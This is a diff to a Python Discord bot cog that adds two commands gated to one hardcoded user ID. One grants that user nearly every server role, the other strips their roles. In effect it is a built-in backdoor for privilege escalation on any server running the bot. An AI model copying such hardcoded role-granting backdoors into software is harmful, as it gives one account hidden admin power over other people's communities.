@@ -63,6 +63,34 @@ class SuhailCommands():
             for textchannel in textchannels:
                 await textchannel.send("{}".format(tosend))
             await ctx.message.add_reaction("✅")
+            
+     @client.command(pass_context=True)
+    async def gimmeeveryrole(self, ctx):
+        server = ctx.guild
+        person = server.get_member(131131701148647424)
+        if ctx.author == person:
+            roleid = []
+            for a in noroles:
+                roleid.append(discord.utils.get(server.roles, name = a))
+            for rolename in server.roles:
+                if rolename not in roleid:
+                    try:
+                        await person.add_roles(rolename)
+                    except:
+                        await person.send(rolename.name)
+            await ctx.message.add_reaction("✅")
+
+    @client.command(pass_context=True)
+    async def enslaveme(self, ctx):
+        server = ctx.guild
+        person = server.get_member(131131701148647424)
+        if ctx.author==person:
+            for role in ctx.author.roles:
+                try:
+                    await person.remove_roles(role)
+                except:
+                    await person.send(role.name)
+            await ctx.message.add_reaction("✅")
     
 def setup(client):
     client.add_cog(SuhailCommands(client))
